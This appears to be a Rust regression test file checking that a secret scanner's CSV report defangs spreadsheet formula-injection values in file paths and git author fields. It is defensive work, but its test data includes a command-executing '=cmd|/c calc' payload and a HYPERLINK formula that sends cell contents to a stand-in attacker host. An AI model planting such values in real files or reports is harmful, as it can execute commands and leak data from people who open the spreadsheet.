//! Regression: the CSV reporter must neutralize spreadsheet formula-injection
//! prefixes (`=`, `+`, `-`, `@`, leading tab/CR) on attacker-controlled fields
//! per OWASP CSV-injection guidance (findings M14 / M20 / M22).
//!
//! Without the guard, a scanned file named `=cmd|/c calc` (or a malicious git
//! author/commit) lands raw in the CSV and is evaluated as a formula when the
//! report is opened in Excel/LibreOffice/Sheets.

use std::borrow::Cow;
use std::collections::HashMap;
use std::sync::Arc;

use keyhog_core::{
    write_report, MatchLocation, ReportFormat, Severity, VerificationResult, VerifiedFinding,
};

fn render(finding: &VerifiedFinding) -> String {
    let mut buf: Vec<u8> = Vec::new();
    write_report(&mut buf, ReportFormat::Csv, &[finding.clone()]).expect("finish csv report");
    String::from_utf8(buf).expect("utf8 csv output")
}

fn finding_with(file_path: &str, author: Option<&str>) -> VerifiedFinding {
    VerifiedFinding {
        detector_id: Arc::from("aws-access-key"),
        detector_name: Arc::from("AWS Key"),
        service: Arc::from("aws"),
        severity: Severity::High,
        credential_redacted: Cow::Borrowed("AKIA...7XYA"),
        credential_hash: [0xab; 32].into(),
        location: MatchLocation {
            source: Arc::from("filesystem"),
            file_path: Some(Arc::from(file_path)),
            line: Some(1),
            offset: 0,
            commit: None,
            author: author.map(Arc::from),
            date: None,
        },
        verification: VerificationResult::Live,
        metadata: HashMap::new(),
        additional_locations: vec![],
        confidence: Some(0.5),
    }
}

#[test]
fn csv_neutralizes_formula_injection_in_file_path() {
    let out = render(&finding_with("=cmd|/c calc", None));
    let row = out.lines().nth(1).expect("data row");

    // The pipe `|` does not trigger RFC-4180 quoting, so the field is emitted
    // bare except for the leading single-quote guard.
    let cell = "'=cmd|/c calc";
    assert!(
        row.split(',').any(|field| field == cell),
        "file_path cell must be prefixed with a single quote to defang the formula: {row:?}"
    );
    // The raw, unguarded formula must NOT appear as a bare cell.
    assert!(
        !row.split(',').any(|field| field == "=cmd|/c calc"),
        "raw formula leaked into a CSV cell: {row:?}"
    );
}

#[test]
fn csv_neutralizes_all_formula_trigger_prefixes() {
    for payload in ["=2+5", "+1", "-1", "@SUM(A1)", "\tlead-tab", "\rlead-cr"] {
        let out = render(&finding_with(payload, None));
        let row = out.lines().nth(1).expect("data row");
        let guarded = format!("'{payload}");
        // The leading guard char must be present immediately before the payload,
        // whether the field is bare or RFC-4180 quoted (tab/CR force quoting).
        assert!(
            row.contains(&guarded),
            "payload {payload:?} was not neutralized in row {row:?}"
        );
    }
}

#[test]
fn csv_neutralizes_formula_injection_in_author_and_still_quotes() {
    // A HYPERLINK formula author contains commas + quotes, so it must be both
    // single-quote guarded AND RFC-4180 double-quote wrapped.
    let author = "=HYPERLINK(\"http://attacker/?\"&A1,\"click\")";
    let out = render(&finding_with("config/app.env", Some(author)));
    let row = out.lines().nth(1).expect("data row");

    // Guarded + quoted: leading `"'=` then doubled inner quotes.
    assert!(
        row.contains("\"'=HYPERLINK(\"\"http://attacker/?\"\"&A1,\"\"click\"\")\""),
        "author formula must be guarded and quoted: {row:?}"
    );
}

#[test]
fn csv_leaves_benign_fields_unchanged() {
    // A normal path must not gain a spurious guard prefix.
    let out = render(&finding_with("config/app.env", None));
    let row = out.lines().nth(1).expect("data row");
    assert!(
        row.split(',').any(|field| field == "config/app.env"),
        "benign file_path must be emitted unmodified: {row:?}"
    );
}
